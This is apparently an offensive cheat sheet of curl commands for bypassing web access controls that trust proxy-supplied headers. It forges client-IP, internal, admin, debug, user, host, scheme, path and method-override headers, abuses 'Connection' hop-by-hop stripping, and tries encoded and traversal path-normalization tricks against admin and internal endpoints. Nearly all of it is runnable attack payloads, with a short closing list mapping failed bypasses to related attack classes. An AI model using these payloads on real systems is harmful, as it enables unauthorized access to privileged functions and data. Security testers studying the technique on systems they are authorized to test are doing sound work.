# Per-check — every check the proxy header gates, exhaustively

The check map — a header the app reads, a check the header gates.

---

## 1. The local-vs-remote check — the client-IP header

```bash
# a local-vs-remote check — a spoofed-IP header / a hop-by-hop strip
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Client-IP: 127.0.0.1'   # a forged client-IP
curl "$BASE/api/admin" -H 'True-Client-IP: 127.0.0.1'   # a forged true-client-IP
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1'   # a forged RFC 7239
curl "$BASE/api/admin" -H 'Connection: keep-alive, X-Real-IP'   # the strip
```

## 2. The internal-route check — the internal flag

```bash
# an internal-route check — a spoofed-internal header / a hop-by-hop strip
curl "$BASE/internal" -H 'X-Internal: true'   # a forged internal flag
curl "$BASE/internal" -H 'X-Internal: 1'   # a forged internal flag
curl "$BASE/internal" -H 'Connection: keep-alive, X-Internal'   # the strip
```

## 3. The admin check — the admin flag

```bash
# an admin check — a spoofed-admin header / a hop-by-hop strip
curl "$BASE/admin" -H 'X-Admin: true'   # a forged admin flag
curl "$BASE/admin" -H 'X-Admin: 1'   # a forged admin flag
curl "$BASE/admin" -H 'Connection: keep-alive, X-Admin'   # the strip
```

## 4. The debug check — the debug flag

```bash
# a debug check — a spoofed-debug header / a hop-by-hop strip
curl "$BASE/api/debug" -H 'X-Debug: true'   # a forged debug flag
curl "$BASE/api/debug" -H 'X-Debug: 1'   # a forged debug flag
curl "$BASE/api/debug" -H 'Connection: keep-alive, X-Debug'   # the strip
```

## 5. The user check — the forwarded-user header

```bash
# a user check — a spoofed-user header / a hop-by-hop strip
curl "$BASE/api/user" -H 'X-Forwarded-User: admin'   # a forged user
curl "$BASE/api/user" -H 'X-Forwarded-Email: admin@target.com'   # a forged email
curl "$BASE/api/user" -H 'Connection: keep-alive, X-Forwarded-User'   # the strip
```

## 6. The host check — the forwarded-host header

```bash
# a host check — a spoofed-host header / a hop-by-hop strip
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # a forged host
curl "$BASE/page" -H 'X-Host: attacker.com'   # a forged X-Host
curl "$BASE/page" -H 'Connection: keep-alive, X-Forwarded-Host'   # the strip
```

## 7. The scheme check — the forwarded-proto header

```bash
# a scheme check — a spoofed-scheme header / a hop-by-hop strip
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a forged proto
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'   # a forged scheme
curl "$BASE/page" -H 'X-Forwarded-Proto: https'   # a forged https
curl "$BASE/page" -H 'Connection: keep-alive, X-Forwarded-Proto'   # the strip
```

## 8. The path check — the original-URL header

```bash
# a path check — a spoofed-path header / a hop-by-hop strip
curl "$BASE/page" -H 'X-Original-URL: /admin'   # a forged path
curl "$BASE/page" -H 'X-Rewrite-URL: /admin'   # a forged rewrite-URL
curl "$BASE/page" -H 'X-Forwarded-Path: /admin'   # a forged forwarded-path
curl "$BASE/page" -H 'X-Forwarded-Prefix: /admin'   # a forged forwarded-prefix
curl "$BASE/page" -H 'X-Original-Path: /admin'   # a forged original-path
curl "$BASE/page" -H 'X-Real-Path: /admin'   # a forged real-path
curl "$BASE/page" -H 'Connection: keep-alive, X-Original-URL'   # the strip
```

## 9. The method check — the method-override header

```bash
# a method check — a spoofed-method header / a hop-by-hop strip
curl "$BASE/api" -H 'X-HTTP-Method-Override: DELETE' -d 'data'   # a forged method
curl "$BASE/api" -H 'X-Original-Method: PUT' -d 'data'   # a forged original-method
curl "$BASE/api" -H 'X-HTTP-Method: PATCH' -d 'data'   # a forged HTTP-method
curl "$BASE/api" -H 'X-Method-Override: DELETE' -d 'data'   # a forged method-override
curl "$BASE/api" -H 'Connection: keep-alive, X-HTTP-Method-Override'   # the strip
```

## 10. The server check — the forwarded-server header

```bash
# a server check — a spoofed-server header / a hop-by-hop strip
curl "$BASE/api" -H 'X-Forwarded-Server: 127.0.0.1'   # a forged server
curl "$BASE/api" -H 'X-Forwarded-Server: internal'   # a forged internal server
curl "$BASE/api" -H 'Connection: keep-alive, X-Forwarded-Server'   # the strip
```

## 11. The port check — the forwarded-port header

```bash
# a port check — a spoofed-port header / a hop-by-hop strip
curl "$BASE/api" -H 'X-Forwarded-Port: 80'   # a forged port
curl "$BASE/api" -H 'X-Forwarded-Port: 443'   # a forged port
curl "$BASE/api" -H 'Connection: keep-alive, X-Forwarded-Port'   # the strip
```

## 12. The authenticated check — the forwarded-user header

```bash
# an authenticated check — a spoofed-user header / a hop-by-hop strip
curl "$BASE/api/user" -H 'X-Forwarded-User: admin'   # a forged user
curl "$BASE/api/user" -H 'X-Forwarded-Email: admin@target.com'   # a forged email
curl "$BASE/api/user" -H 'X-Forwarded-Auth: true'   # a forged auth flag
curl "$BASE/api/user" -H 'Connection: keep-alive, X-Forwarded-User'   # the strip
```

## 13. The multi-proxy check — the chained normalization

```bash
# a multi-proxy chain — a header each strips differently
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge strips it; the origin doesn't
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # a chained user differential
```

## 14. The normalization check — a path the two parse differently

```bash
# a normalization check — a path the proxy and the app normalize differently
curl "$BASE/static/../admin"   # a traversal boundary
curl "$BASE/%2e%2e/admin"   # an encoded traversal
curl "$BASE/%61dmin"   # an encoded 'a' — a case/encoding boundary
curl "$BASE/%2fadmin"   # an encoded '/'
curl "$BASE/page//admin"   # a double-slash boundary
curl "$BASE/page./admin"   # a dot-slash boundary
curl "$BASE/%252e%252e/admin"   # a doubly-encoded traversal
curl "$BASE/admin%20"   # a trailing-space boundary
curl "$BASE/admin%09"   # a trailing-tab boundary
curl "$BASE/admin%00"   # a trailing-null boundary
curl "$BASE/admin?"   # a trailing-? boundary
curl "$BASE/admin#"   # a trailing-# boundary
curl "$BASE/admin.html"   # a trailing-extension boundary
```

## 15. The per-check falsifier — when the check is dead

```text
a proxy that doesn't strip its own header → the hop-by-hop bypass fails
a proxy that strips a client-supplied header → the client-supplied
  bypass fails → the hop-by-hop bypass is the vector
a proxy that verifies the header it added → the client-supplied bypass
  fails → the hop-by-hop bypass is the vector
a non-header check → a different class
the proxy and the app normalize the same way → no confusion
a stored copy → a cache-poisoning
a desync → a request-smuggling
a session check → an auth-session
a host check → a host-header
a fetch → an ssrf
a read → a cors
```
